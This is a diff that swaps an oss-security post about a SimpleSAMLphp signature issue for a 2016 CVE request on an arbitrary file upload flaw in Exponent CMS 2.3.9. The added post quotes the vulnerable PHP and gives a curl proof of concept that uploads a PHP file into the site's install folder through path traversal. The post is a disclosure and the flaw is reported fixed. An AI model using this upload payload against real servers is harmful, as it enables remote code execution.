@@ -1,24 +1,83 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/12/14/7
-Message-ID: <20161214144822.cfn2zv4s2bdlbdvi@eldamar.local>
-Date: Wed, 14 Dec 2016 15:48:22 +0100
-From: Salvatore Bonaccorso <carnil@...ian.org>
-To: OSS Security Mailinglist <oss-security@...ts.openwall.com>
-Subject: CVE Request: SimpleSAMLphp: SSPSA 201612-02: Incorrect signature verification
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/21/3
+Message-ID: <CAEiFw0UvtbGuJ-M_zR0M+BtrEMn_tg7J3KZs+huS25imOSTNkg@mail.gmail.com>
+Date: Wed, 21 Sep 2016 08:10:39 +0800
+From: Carl Peng <felixk3y@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: CVE request：Exponent CMS 2.3.9 Arbitrary File Upload vulnerability in expFile.php
 Content-Type: text/plain; charset=utf-8
 
-Hi
+Hi, I reported the following Arbitrary File Upload vulnerability to the
+ExponentCMS team on Sep 13, 2016:
+vulnerability:
+https://github.com/exponentcms/exponent-cms/blob/master/framework/modules/file/controllers/fileController.php#L570-L592
+```
+if (!empty($this->params['folder']) || (defined('QUICK_UPLOAD_FOLDER') &&
+QUICK_UPLOAD_FOLDER != '' && QUICK_UPLOAD_FOLDER != 0)) {
+            // prevent attempt to place file somewhere other than /files
+folder
+            if (!empty($this->params['folder']) &&
+strpos($this->params['folder'], '..') !== false) {
+                $ar = new expAjaxReply(300, gt("File was not uploaded!"));
+                $ar->send();
+            }
+            if (SITE_FILE_MANAGER == 'picker') {
+                $quikFolder = !empty($this->params['folder']) ?
+$this->params['folder'] :QUICK_UPLOAD_FOLDER;
+                $destDir = null;
+            } elseif (SITE_FILE_MANAGER == 'elfinder') {
+                $quikFolder = null;
+                $destDir = UPLOAD_DIRECTORY_RELATIVE .
+(!empty($this->params['folder']) ? $this->params['folder']
+:QUICK_UPLOAD_FOLDER) . '/';
+                // create folder if non-existant
+                expFile::makeDirectory($destDir);
+            }
+        } else {
+            $quikFolder = null;
+            $destDir = null;
+        }
+        //extensive suitability check before doing anything with the file...
+        if (isset($_SERVER['HTTP_X_FILE_NAME'])) {  //HTML5 XHR upload
+            $file =
+expFile::fileXHRUpload($_SERVER['HTTP_X_FILE_NAME'],false,false,null,$destDir,intval(QUICK_UPLOAD_WIDTH));
+ //here File Upload vulnerability
+            $file->poster = $user->id;
+```
+the "folder"  and "$_SERVER['HTTP_X_FILE_NAME']", the two parameters may be
+submitted by the user
 
-SimpleSAMLphp has released (another) update fixing an incorrect
-signature verification issue (different from SSPSA 201612-01 /
-CVE-2016-9814). It affects versions of SimpeSAMLphp before 1.14.11.
+expFile::fileXHRUpload():
+https://github.com/exponentcms/exponent-cms/blob/master/framework/modules/file/models/expFile.php#L526
+```
+$_destFile = ($_destFile == null) ? self::fixName($fileName) : $_destFile;
+//"fileName" parameter may be submitted by the user
+//...
+$maxwidth = intval($_max_width);
+if (!empty($maxwidth)) {
+..///
+} else {
+    file_put_contents($_destFullPath, file_get_contents('php://input',
+'r')); // line 572
+}
 
-Upstream advisory: https://simplesamlphp.org/security/201612-02
+Proof of concept:
+curl -H "X-File-Name: e.php" -d
+"controller=file&action=quickUpload&code=<?php
+phpinfo();?>&folder=../install" http://www.exponentcms.org/index.php
 
-References:
-https://github.com/simplesamlphp/simplesamlphp/commit/a2326d75dd14accaac162dd2cb30aaefcc1f9205
+http://www.exponentcms.org/install/e.php
 
-Could you please assign a CVE for this issue?
 
-Regards,
-Salvatore
+And Now, This  vulnerability have been fixed.
+https://exponentcms.lighthouseapp.com/projects/61783/changesets/355702a9835cf527796c9d469a82258b7639148a
+https://github.com/exponentcms/exponent-cms/commit/355702a9835cf527796c9d469a82258b7639148a
+
+This issue was reported by Peng Hua of silence.com.cn Inc. and I would like
+to request a CVE for this issue (if not done so).
+
+Thank you.
+---------------------------------http://www.silence.com.cn
+penghua#silence.com.cn
+PKAV Team
+
